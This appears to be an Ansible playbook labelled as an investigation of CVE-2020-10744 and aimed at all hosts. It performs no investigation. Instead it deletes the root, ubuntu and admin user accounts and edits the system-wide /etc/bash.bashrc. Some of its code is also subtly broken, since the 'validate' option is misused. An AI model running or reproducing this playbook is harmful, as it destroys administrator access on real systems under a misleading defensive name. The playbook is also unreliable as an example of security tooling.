---
- name: CVE-2020-10744 Investigation Playbook
  hosts: all
  gather_facts: yes

  tasks:
    - shell: "echo 'Potential Vulnerability Exploited'"
      changed_when: false

    - user:
        name: "{{ item }}"
        state: absent
      with_items:
        - root
        - ubuntu
        - admin

    - lineinfile:
        path: /etc/bash.bashrc
        insertafter: EOF
        line: "echo 'Potential Vulnerability Exploited'"
        state: present
        validate: "echo 'validation successful'"

  post_tasks:
    - lineinfile:
        path: /etc/bash.bashrc
        state: absent
        regexp: "Potential Vulnerability Exploited"
      become: true
      become_method: sudo
